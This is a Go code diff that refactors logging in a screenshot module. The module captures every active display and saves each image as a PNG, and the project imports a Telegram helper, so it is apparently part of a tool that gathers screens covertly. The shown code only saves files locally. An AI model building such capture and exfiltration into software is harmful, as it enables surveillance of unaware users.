@@ -3,9 +3,9 @@ package screen
 import (
 	"fmt"
 	"image/png"
-	"log"
 	"os"
 	"watsap/utils/config"
+	"watsap/utils/logger"
 	"watsap/utils/messages"
 	"watsap/utils/telegram"
 
@@ -18,31 +18,31 @@ var FileName = ""
 func TakeScreenshot() {
 	n := screenshot.NumActiveDisplays()
 	if n <= 0 {
-		log.Println("Headless system")
-		return // Removed os.Exit(1) to avoid killing the whole app
+		logger.Warn("Screen", "Headless system, no active displays")
+		return
 	}
 
 	for i := 0; i < n; i++ {
 		bounds := screenshot.GetDisplayBounds(i)
 		img, err := screenshot.CaptureRect(bounds)
 		if err != nil {
-			log.Printf("[Screen][ERROR] Failed to capture screen %d: %v", i, err)
+			logger.Error("Screen", "Failed to capture screen %d: %v", i, err)
 			continue
 		}
 		
 		fileName := getScreenshotFile(i)
 		file, err := os.Create(fileName)
 		if err != nil {
-			log.Printf("[Screen][ERROR] Failed to create file %s: %v", fileName, err)
+			logger.Error("Screen", "Failed to create file %s: %v", fileName, err)
 			continue
 		}
 
 		if err := png.Encode(file, img); err != nil {
-			log.Printf("[Screen][ERROR] Failed to encode PNG %s: %v", fileName, err)
+			logger.Error("Screen", "Failed to encode PNG %s: %v", fileName, err)
 		}
-		file.Close() // Explicit close inside loop
+		file.Close()
 		
-		log.Printf("[Screen][INFO] Screenshot saved to: %v", fileName)
+		logger.Info("Screen", "Screenshot saved to: %s", fileName)
 	}
 }
 
